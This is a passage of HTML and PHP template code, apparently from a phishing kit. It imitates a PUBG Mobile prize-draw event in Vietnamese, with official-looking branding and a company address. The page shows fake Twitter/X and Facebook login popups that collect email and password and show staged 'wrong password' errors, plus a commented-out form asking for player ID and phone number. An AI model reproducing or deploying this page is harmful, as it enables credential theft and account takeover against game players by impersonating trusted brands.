    width: 100%;
    height: 45px;
}
.popup-box-form-footer button {
    background: url(img/button.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: -2px;
    padding: 5px;
    padding-left: 30px;
    padding-right: 30px;
    color: #000;
    font-size:17px;
    font-family: selow;
    font-weight: 500;
    text-align: center;
    border: none;
    outline: none;
}
.popup-btn-login {
    width: 38%;
    height: 35px;
    padding: 6px;
    margin-top: 15px;
    margin-bottom: 10px;
    margin: 5px;
    color: #000;
    font-size: 16px;
    font-family:selow;
    border: none;
    border-radius: 3px;
    outline: none;
    margin-bottom: 45px;
    position: relative;
}
.popup-btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.popup-btn-facebook {
    background: #1778f2;
    color: #fff;
    margin-bottom: 45px;
}
.popup-btn-twitter {
    background: #198B96;
    margin-bottom: 3px;
    color: #fff;
}
.popup-btn-login-link {
    width: 80%;
    height: 35px;
    padding: 6px;
    margin-top: 15px;
    margin-bottom: 10px;
    margin: 5px;
    color: #000;
    font-size: 16px;
    font-family:selow;
    border: none;
    border-radius: 3px;
    outline: none;
    margin-bottom: 45px;
    position: relative;
}
.popup-btn-link {
    background: #E3B448;
    margin-bottom: 3px;
    color: #000;
}
.popup-btn-login-link img {
    width:22px;
    height:22px;
    color: #fff;
    font-size: 20px;
    float: left;
}
.popup-login {
    background:rgba(0,0,0,0.4);
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index:9999;
}
.popup-box-login-fb {
    background:#ECEFF6;
    max-width:330px;
    height:auto;
    position:relative;
    margin:50px auto;
    margin-top:5%;
    text-align:center;
    font-family:'Teko';
    color:#000;
    border-radius:10px;
}
.popup-box-login-twitter {
    background:#fff;
    max-width:330px;
    height:auto;
    position:relative;
    margin:50px auto;
    margin-top:5%;
    text-align:center;
    font-family:'Teko';
    color:#000;
    border-radius:5px;
}
.close-fb {
    background: #3b5998;
    width: 25px;
    height: 25px;
    color: #fff;
    font-size: 20px;
    text-align: center;
    text-decoration: none;
    border-radius: 50%;
    top: -10px;
    right: -10px;
    position: absolute;
    display: block;
}
.close-fb i {
    padding-top: 3px;
}
.close-other {
    background: #fff;
    width: 25px;
    height: 25px;
    color: #000;
    font-size: 20px;
    text-align: center;
    border-radius: 50%;
    top: -12px;
    right: -12px;
    position: absolute;
    z-index: 9999999;
    display: block;
}
.close-other i {
    color: #20px;
    padding-top: 3px;
}
.popups {
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index:9999;
    background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-wrappers {
    width: 390px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 15%;
    text-align: center;
    font-family:'selow';
    color:#fff;
}
.popup-box-navbars {
    background:url(img/popup-navbar2.png) no-repeat center center;
    background-size:100% 100%;
    height: 43px;
    padding-bottom: 5px;
}
.popup-box-navbars img {
    width: 20px;
    height: 20px;
    margin-top: 15px;
    margin-right: 18px;
    float: right;
}
.popup-box-navbars-title {  
    padding-left: 40px;
    padding-top: 14px;
    padding-bottom: 2px;
    font-size: 20px;
    color: #fff;
    font-family:selow;
    font-weight: 300;
    text-align: center; 
}
.kagetk {     
    background: rgba(0, 0, 0, 0.2);
    background-size:50% 50%;
    width: 80%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    border: 1px solid #fff;
    display: none;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: selow;
    text-align: center;
}
.popup-box-bgs {
    background:url(img/popup-box-bg2.png) no-repeat center center;
    background-size:100% 100%;
    width: 100%;
    margin-top: -12px;
}
.popup-box-alerts4 {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 5px;
    color: #fff;
    font-size: 20px;
    font-family:selow;
    font-weight: 500;
    text-align: left;
    display: block;
}
.popup-box-alerts4 i {
    padding-top: 15px;
    padding-bottom: 15px;
    color: #F5EAB0;
    font-size: 50px;
    text-align: left;
}
.popup-box-formx label {
  width: 70%;
  text-align: left;
  padding-left: 20px;
  color: #B7B7B7;
  text-shadow:none;
  font-size:17px;
}
.popup-box-formx input {
    background: #001;
    width: 85%;
    height: 35px;
    margin-bottom: 8px;
    margin-left: 20px;
    padding-right: 4px;
    padding: 4px;
    color: #fff;
    font-size:15px;
    font-family:selow;
    font-weight: 500;
    border: 0.1px solid #fff;
    outline:none;
    position: left;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.popup-box-formx input::placeholder {
    color: #BCCBCE;
}
.popup-box-formx-footer {
    background-size:100% 100%;
    width: 100%;
    height: 45px;
    margin-top: 20px;
}
.popup-box-formx-footer button {
    background: url(img/button.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: 5px;
    padding: 4px;
    padding-left: 30px;
    padding-right: 30px;
    color: #F4CD34;
    font-size:18px;
    font-family: selow;
    font-weight: 500;
    text-align: center;
    border:none;
    outline: none;
}
.kanan {
    float: right;
}
.kiri {
    float: left;
}
.tengah {
    margin-left: auto;
    margin-right: auto;
    display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
figure {
    margin: 0;
    padding: 0;
    overflow: hidden;
}
.itemShine figure {
    position: relative;
}
.itemShine figure::before {
    background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
    background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
    width: 50%;
    height: 100%;
    top: 0;
    left: -75%;
    position: absolute;
    z-index: 2;
    content: '';
    display: block;
    -webkit-transform: skewX(-25deg);
    transform: skewX(-25deg);
}
.itemShine figure::before {
    -webkit-animation: shine 2s infinite;
    animation: shine 2s infinite;
}
@-webkit-keyframes shine {
    100% {
        left: 125%;
        }
}
.shine, .chrome {
    font-size: 14px;
    margin: 0 auto;
    margin-bottom: 1em;
    font-weight: bold;
}
.shine {
    background: #222 -webkit-gradient(linear, left top, right top, from(#222), to(#222), color-stop(0.5, #fff)) 0 0 no-repeat;
    -webkit-background-size: 150px;
    color: $text-color;
    -webkit-background-clip: text;
    -webkit-animation-name: shine;
    -webkit-animation-duration: $duration;
    -webkit-animation-iteration-count: infinite;
    text-shadow: 0 0px 0px rgba(255, 255, 255, 0.5);
}
.chrome {
    background: #222 -webkit-gradient(linear, left top, right top, from(#222), to(#222), color-stop(0.5, #fff)) 0 0 no-repeat;
    background-image: -webkit-linear-gradient(-40deg, transparent 0%, transparent 40%, #fff 50%, transparent 60%, transparent 100%);
    -webkit-background-size: 200px;
    color: $text-color;
    -webkit-background-clip: text;
    -webkit-animation-name: shine;
    -webkit-animation-duration: $duration;
    -webkit-animation-iteration-count: infinite;
    text-shadow: 0 0px 0px rgba(255, 255, 255, 0.5);
}

@-webkit-keyframes shine {
    0%, 10% {
        background-position: -1000px;
    }
    20% {
        background-position: top left;
    }
    90% {
        background-position: top right;
    }
    100% {
        background-position: 1000px;
    }
}
.border_hadiah{
    border:3px solid #FBF274;    
}
.twitter-load { 
    background-size: 100% 100%;
    width: 93%;
    height: 505.2px;
    margin-top: 0px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 15px;
    padding: 20px;
    padding-top: 0px;
    padding-bottom: 25px;
    display: block;
}
.twitter-load-title {
    width: 95%;
    height: auto;
    margin-top: 50px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 50px;
    padding: 6px;
    padding-top: 90px;
    color: #fff;
    font-size: 18px;
    font-family:laza;
    font-weight: 500;
    text-align: center;
    display: block;
}
.twitter-load-title i {
    margin-top: 70px;   
    padding-top: 15px;
    padding-bottom: 15px;
    color: #00acee;
    font-size: 50px;    
    text-align: center;
}
.fb-load {  
    background-size: 100% 100%;
    width: 93%;
    height: 299.1px;
    margin-top: -1px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 15px;
    padding: 20px;
    padding-top: 0px;
    padding-bottom: 25px;
    display: block;
}
.fb-load img {      
    width: 50px;
    height: 50px;   
    margin-top: 192.5px;    
    margin-bottom: -55px;
}
.fb-load-title {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 6px;
    color: #999998;
    font-size: 18px;
    font-family:laza;
    font-weight: 500;
    text-align: center;
    display: block;
}
.fb-load-title i {
    margin-top: 200px;
    padding-top: 15px;
    padding-bottom: 15px;
    color: #999998;
    font-size: 30px;    
    text-align: center;
}
.man-role {
    position: absolute;
    width:65%;
    margin-top:30%; 
    right: 0%;
}   
.seclink-box {
    width: 390px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 15%;
    text-align: left;
    font-family:'selow';
    color:#fff;
}
.seclink-box-navbar {
    background:url(img/popup-navbar-sec.png) no-repeat center center;
    background-size:100% 100%;
    height: 43px;
    padding-bottom: 0px;    
}
.seclink-box-navbar img {
    width: 20px;
    height: 20px;
    margin-top: 13px;
    margin-right: 15px;
    float: right;
}   
.seclink-box-navbar-title { 
    padding-top: 10px;
    padding-bottom: 2px;
    font-size: 19px;
    font-family:selow;
    font-weight: 300;
    margin-left: 17px;  
    text-align: left;   
    color: #fff;
}
.seclink-box-bg {
    background:url(img/popup-box-bg-sec.png) no-repeat center center;
    background-size:100% 100%;
    width: 100%;
    margin-top: -1px;
    border-top:1px solid #fff;
}   
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.seclink-box-bg {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #DD3183, yellow, #DD3183) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.seclink-box-alert {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 5px;
    color: #fff;
    font-size: 20px;
    font-family:selow;
    font-weight: 500;
    text-align: left;
    display: block;
}
.seclink-box-alert i {
    padding-top: 15px;
    padding-bottom: 15px;
    color: #F5EAB0;
    font-size: 50px;
    text-align: left;
}
.seclink-box-bg label {
  width: 70%;
  text-align: left;
  padding-left: 20px;
  margin-bottom: 2px;
  color: #B7B7B7;
  text-shadow:none;
  font-size:17px;
  display:inline-block;
}
.seclink-box-form input {
    background: #001;
    width: 90%;
    height: 35px;
    margin-bottom: 8px;
    margin-left: 20px;
    padding-right: 4px;
    padding: 4px;
    color: #fff;
    font-size:15px;
    font-family:selow;
    font-weight: 500;
    border: 0.1px solid #fff;
    outline:none;
    position: left;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.seclink-box-form input::placeholder {
    color: #BCCBCE;
}
.seclink-box-form-login {
    background: #001;
    width: 85%;
    height: 35px;
    margin-bottom: 8px;
    margin-left: 20px;
    padding-right: 4px;
    padding: 4px;
    color: #fff;
    font-size:15px;
    font-family:selow;
    font-weight: 500;
    border: 0.1px solid #fff;
    outline:none;
    position: left;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.seclink-box-form-code {
    background: #001;
    width: 40%;
    height: 35px;
    margin-bottom: 8px;
    margin-left: 20px;
    padding-right: 4px;
    padding: 4px;
    color: #fff;
    font-size:15px;
    font-family:selow;
    font-weight: 500;
    border: 0.1px solid #fff;
    outline:none;
    position: left;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.seclink-box-form-code input::placeholder {
    color: #BCCBCE;
}
.seclink-box-form-region {
    background: #001;
    width: 26%;
    height: 35px;
    margin-bottom: 8px;
    margin-left: 20px;
    padding-right: 4px;
    padding: 4px;
    color: #fff;
    font-size:15px;
    font-family:selow;
    font-weight: 500;
    border: 0.1px solid #fff;
    text-align:left;
    outline:none;
    display: inline-block;
    -webkit-appearance: none;
    -moz-appearance: none;
}
.seclink-box-form-region input::placeholder {
    color: #BCCBCE;
}
.seclink-box-form-number {
    background: #001;
    width: 56%;
    height: 35px;
    margin-bottom: 8px;
    margin-left: 5px;
    padding-right: 4px;
    padding: 4px;
    color: #fff;
    font-size:15px;
    font-family:selow;
    font-weight: 500;
    border: 0.1px solid #fff;
    outline:none;
    position: left;
    display: inline-block;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.seclink-box-form-number input::placeholder {
    color: #BCCBCE;
}
.seclink-code-btn {
    background: #2F3E41;
    background-size: 100% 100%;
    width: 30%;
    height: 36px;
    padding-top: 1.5px;
    margin-left: 15px;  
    border: 1px solid #BAE9E3;
    color: #BAE9E3;
    font-size:16px;
    font-family: selow;
    font-weight: 300;
    text-align: center; 
    outline: none;
}
.seclink-box-footer {
    background-size:100% 100%;
    margin-top: 20px;
    width: 100%;
    height: 45px;
}
.seclink-box-footer button {
    background: url(img/button.png) no-repeat center;
    background-size: 100% 100%;
    width: 30%;
    height: 35px;
    margin-top: -5px;
    margin-bottom: 5px;
    padding: 4px;
    padding-left: 35px;
    padding-right: 35px;
    color: #000;
    font-size:18px;
    font-family: selow;
    font-weight: 500;
    text-align: center;
    border: none;
    outline: none;
}
.seclink-wrapper-border {
    height: 11px;   
}
.seclink-wrapper {
    width: 70.3%;
    height: auto;   
    margin-right: auto;
    display: block;
    margin-left:21px;
}
.seclink-content {
    background: #303030;
    background-size:100% 100%;
    width: 40%;
    height: 30px;
    margin: -2px;
    color: #fff;
    border: 0.5px solid #fff;   
    display: inline-block;
    padding: 5px;
    font-size: 15px;
    font-family: selow;
    font-weight: 300;
    text-align: center;
    text-shadow: none;
}
.seclink-content-active {
    background: #2F3E41;
    background-size:100% 100%;
    border: 0.5px solid #BAE9E3;
    color: #BAE9E3;
    padding: 5px;
    font-size: 15px;
    font-family: selow;
    font-weight: 300;
    text-align: center;
    text-shadow: none;
}
@media only screen and (max-width:600px) {
    .container, .container2, .container3, .container4 {
        width: 100%;
        height: auto;
        margin-top: -3px;
        margin-bottom: 0px;
        border: none;
        border-radius: 0px;
        padding: 0px;
    }
    .event-title {
        width: 90%;
        height: 67px;
    }
    .event-notification-content {
        width: 84.6%;
        margin-top: -46px;
        margin-right: 0.3px;
        border-left: 0px;
    }
    .event-notification {    
    width:98%;
    height:53px;
    padding:7px;
    margin-right: auto;
    margin-left: auto;
    }
    .event-notification-text {
    padding-top:10px;
    font-family:selow;
    font-size:16px;
    }
    .box {
        width: 100%;
        height: 450px;
    }
    .sec-box-item {
        width: 25%;
        height: auto;   
        margin-right:-18px;                                 
    }
    .sec-box-item2 {
        width: 25%;
        height: auto;   
        margin-top:47px;                            
    }
    .item2 {
        width: 22%;
        height: 76px;
        margin-top: 12px;        
        margin: 1px;
    }
    .item3 {
        width: 28%;
        height: 96px;
    }
    .itembutton {
        width: 30%;
        height: 36px;
    } 
    .seclink-box {
        width: 360px;
        margin-top: 40%;
    }       
    .item4 {
        width: 40%;
        height: 77px;
        margin: 3px;
    }
    .Kinnon-box {        
    width: 100px;
    height: 100px;                  
    display: block;     
    }
    .box-selector {        
    width: 100%;
    height: 100%;       
    }        
    .item7 {
        width: 67px;
        height: 67px;                
    }    
    .item6 {
        width: 69px;
        height: 69px;               
    }                
    .item {
        height: 95px;
    }
    .item .item-nominal {
        padding-right: 3px;
        bottom: -60px;
    }
    .footer {
         background-position-y: calc(500 / 540 *110vw);
         border-top: 0px solid #C3A4FE;
         border-left: 0px solid #6FF8F8;
         border-right: 0px solid #6FF8F8;
         border-bottom: 0px solid #6FF8F8;
    }
    .about-box-content {
        margin-top: 15px;
    }
    .popup-box-wrapper {
        width: 360px;
        margin-top: 50%;
    }
    .popup-box-wrappers {
        width: 360px;
        margin-top: 40%;
    }
    .popup-box-item {
        width: 25%;
        height: 85px;
    }
    .popup-box-verification {
        margin-top: 20%;
    }
    .popup-box-login-fb {
        margin-top: 5%;
    }
    .popup-box-login-twitter {
        margin-top: 5%;
    }
}
</style>  
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuOPOCW0_odiVaBwlCfpH-b2XaHpZSsJKYM1WGJ6dGqNu95wrnSpW4UZ5oePny4ulr-vuR">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<img src="<?php echo isset($bannerLink) ? $bannerLink  : ''; ?>">
</div> <!--- header --->
<div class="loadkin load" style="display: none;">
<div class="loadkin-box">
<img src="img/loading1.gif">
<br><i>Loading...</i>
</div> <!--- loadkin-box --->
</div> <!--- loadkin load --->
<div class="spin-sec">
<div class="sec-container">
<div class="sec-event-title">
<div class="event-alert" style="background: url(img/s4_text1.png) no-repeat center center;
    background-size: 100% 100%;
    width: 95%;
    height: 55px;
    margin-left: auto;
    margin-right: auto;
    padding: 5px;
    display: block;
    border-radius: 4px;">
    <div>
		<img src="img/s4_text1.png" style="display: none">
	<div class ="can"  >
		<div class="event-alert-desc" style="text-align: center;
		font-size: 25px;
		position: relative;
		top: 10px;
		">Sự Kiện Quy Đổi Tháng 5</div>
		</div>
		</div>
		
</div> <!--- sec-event-title --->
<div class="box">
<div class="sec-notify"><center>
<div class="event-notify">
<div class="event-notify-text">
LỊCH SỬ</div></div>
<div class="alert-text">
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; </div>
</center></div>
    <div class="sec-box-item">
    <div class="Kinnon-box">
    <div class="item7" data-order="0">
    <img src="https://img.lazcdn.com/g/p/5c721d75a2bb91f64ab172f2f47e1ee1.png_720x720q80.png">">
    </div></div>
    <div class="Kinnon-box">
    <div class="item7" data-order="2">
    <img src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">">
    </div></div>
    <div class="Kinnon-box">
    <div class="item7" data-order="4">
    <img src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">">
    </div></div>
    <div class="Kinnon-box">
    <div class="item7" data-order="6">
    <img src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">">
    </div></div>
    </div> <!--- sec-box-item--->
    <div class="sec-box-item2">
    <div class="Kinnon-box">
    <div class="item7" data-order="1">
    <img src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">">
    </div></div>
    <div class="Kinnon-box">
    <div class="item7" data-order="3">
    <div class="item-nominal"></div>
    <img src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">">
    </div></div>
    <div class="Kinnon-box">
    <div class="item7" data-order="5">
    <div class="item-nominal"></div>
    <img src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">">
    </div></div>
    </div> <!--- sec-box-item--->
    <div class="sec-box-item" style="margin-left:-18px">
    <div class="Kinnon-box">
    <div class="item7" data-order="7">
    <img src="<?php echo isset($gift7Link) ? $gift7Link : ''; ?>">">
    </div></div>
    <div class="Kinnon-box">
    <div class="item7" data-order="9">
    <img src="<?php echo isset($gift8Link) ? $gift8Link : ''; ?>">">
    </div></div>
    </div> <!--- sec-box-item--->
    <div class="sec-box-item2">
    <div class="Kinnon-box">
    <div class="item7" data-order="8">
    <img src="<?php echo isset($gift9Link) ? $gift9Link : ''; ?>">">
    </div></div>
    </div> <!--- sec-box-item--->
    </div> <!--- box --->
    <div class="sec-footer">
     
<div class="itembutton" style="animation: bounce .5s infinite alternate;" onclick="go_spin();" onmousedown="buka.play();">BẮT ĐẦU</div>

        
</div>
</div> <!--- sec-container --->
</div> <!--- spin-sec --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onmousedown="tutup.play();" onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter"><img src="img/style-img/icon-twitter.png">
<div class="header-twitter-text"> Log in With Twitter </div></div> <!--- navbar-fb-text --->
<div class="content-box-twitter">
<div class="txt-login-twitter">Log in to your X account to connect to PUBG MOBILE.</div> <!--- txt-login-twitter --->
<div class="content-box-twitter-txt">
<img src="img/icon_2.jpg">
<div class="content-box-twitter-txt-title">
PUBG MOBILE<br></div>
<div class="content-box-twitter-txt-det">
WINNER WINNER CHICKEN DINNER!
<br>
Official PUBG MOBILE Game!</div></div>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="email-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Phone, email, or username</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<div class="form-group-sohi TwitterShowPassword" onclick="showTwitterPassword()">
<img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
</div> <!--- form-group-sohi TwitterShowPassword --->
<div class="form-group-sohi TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()">
<img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
</div> <!--- form-group-sohi TwitterHidePassword --->
<input type="password" name="password" id="password-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Password</label>
</div> <!--- form-group-twitter --->
<center><div class="alert-twitter-failed email-tw">
<a class="alert-twitter"><img class"alert-img" src="img/style-img/alert.png">Sorry, we couldn't find your account.</a></div>
<div class="alert-twitter-failed sandi-tw">
<a class="alert-twitter"><img class"alert-img" src="img/style-img/alert.png">Wrong Password!</a></div></center>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<button type="submit" href='#kinn-verify-on' class="onbutton" onclick="ValidateLoginTwitterData()">Log in</button>
</form>
<div class="content-box-twitter-txt-footer">
We recommend reviewing the app's terms and privacy policy to understand how it will use data from your Twitter account. You can revoke access to any app at any time from the <a>Apps and sessions</a> of your Twitter account settings.<br></div>
<div class="content-box-twitter-txt-footers">
By continuing, PUBG MOBILE will receive ongoing access to the information that you share and Twitter will record when PUBG MOBILE accesses it. <a>Learn more</a> about this sharing and the settings that you have. PUBG MOBILE's <a>Privacy Policy</a> and <a>Terms</a>.<br></div>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter-load" style="display: none;">
<div class="popup-box-login-twitter">
<div class="header-twitter"><img src="img/style-img/icon-twitter.png">
<div class="header-twitter-text"> Log in With Twitter </div></div> <!--- navbar-fb-text --->
<div class="twitter-load">
<div class="twitter-load-title">
<div class="loader2"></div>
</div> <!--- twitter-load-title --->
</div> <!--- twitter-load --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="img/style-img/icon-facebook.png">
<div class="navbar-fb-text"> Đăng Nhập Facebook </div></div> <!--- navbar-fb-text --->
<div class="navbar-alert-fb email-fb">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></div> <!--- navbar-alert --->
<div class="navbar-alert-fb sandi-fb">The password that you've entered is incorrect. <b>Forgotten password?</b></div> <!--- navbar-alert --->
<div class="content-box-fb">
<img src="img/style-img/icon_2.jpg">
<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE.</div> <!--- txt-login-fb --->
<div class="txt-login-alert">This doesn't let the app post to Facebook.</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<div class="login-form-shid showPassword" id="showFbPassword" onclick="showFbPassword()">Show</div> <!--- login-form-shid showPassword --->
<div class="login-form-shid hidePassword" style="display: none;" onclick="hideFbPassword()">Hide</div> <!--- login-form-shid hidePassword --->
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-footer">By continuing, PUBG MOBILE will receive ongoing access to the information that you share and Facebook will record when PUBG MOBILE accesses it. <a>Learn more</a> about this sharing and the settings that you have.</div> <!--- txt-footer --->
<div class="txt-footers">PUBG MOBILE's <a>Privacy Policy</a> and <a>Terms</a>
</div> <!--- txt-footer ---><br>
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb"><img src="img/style-img/icon-facebook.png">
<div class="navbar-fb-text"> Log in With Facebook </div></div> <!--- navbar-fb-text --->
<div class="content-box-fb">
<div class="fb-load">
<img src="img/style-img/icon_fb.png">
<div class="loader3"></div>
</div> <!--- fb-load --->
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<!-- <div class="popup account_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrappers">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div>
</div>
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>Complete your account details</div>
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="Player ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Player ID')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Choose your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level</option> -->

<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrappers">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div>
</div>
<div class="popup-box-bg">
<div class="popup-box-loading"><br><br>
<img class="animate-spin" src="img/style-img/loading.png"></img>
<br> Checking your account details...
<br><br>
</div>
<div class="popup-box-footer"></div>
</div>
</div>
</div>


<div class="footer">
            <div class="footer-txt-follow" style="
    color: white;
">
                 <center> <img src="img/logo-footer.png" style="width: 350px">
                     </center>
                        <center> <img src="img/footer.png" style="width: 350px">
                    <hr> </center>
                <div class=""> <p><font face="verdana">Công Ty Cổ Phần Giải Trí Và Thể Thao Điện Tử Việt Nam | Tầng 29, tòa nhà Lotte Hà Nội, Số 54, Liễu Giai, Phường Cống Vị, Quận Ba Đình, Hà Nội.</font></p></div> 
            </div>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup spin-alert animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Notice</div>
</div>
<div class="popup-box-bg">
<div class="popup-box-alert3">
<p>Players can only spin once.
<br>The reward is only valid for one Player ID.
<br>If played multiple times, only the first reward will be sent!
</p></div>
<div class="popup-box-sub">Start the Lucky draw now?</div>
<div class="popup-box-alert0">
</div>
<div class="popup-box-footero">
<button onclick="go_spin()" type="button" onmousedown="buka.play();" style="margin-right: 0; float: none;">OK</button>
</div>
</div>
</div>
</div>
</div>

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Thông Báo</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>Phần Thưởng</div> <!--- popup-box-alert --->
<div class="popup-box-item">
<script type='text/javascript'>
var Banner1k= new Array()

Banner1k[0]="<img src='https://img.lazcdn.com/g/p/5c721d75a2bb91f64ab172f2f47e1ee1.png_720x720q80.png'/>"
Banner1k[1]="<img src='<?php echo isset($gift1Link) ? $gift1Link : ''; ?>'/>"
Banner1k[2]="<img src='<?php echo isset($gift2Link) ? $gift2Link : ''; ?>'/>"
Banner1k[3]="<img src='<?php echo isset($gift3Link) ? $gift3Link : ''; ?>'/>"
Banner1k[4]="<img src='<?php echo isset($gift4Link) ? $gift4Link : ''; ?>'/>"
Banner1k[5]="<img src='<?php echo isset($gift5Link) ? $gift5Link : ''; ?>'/>"
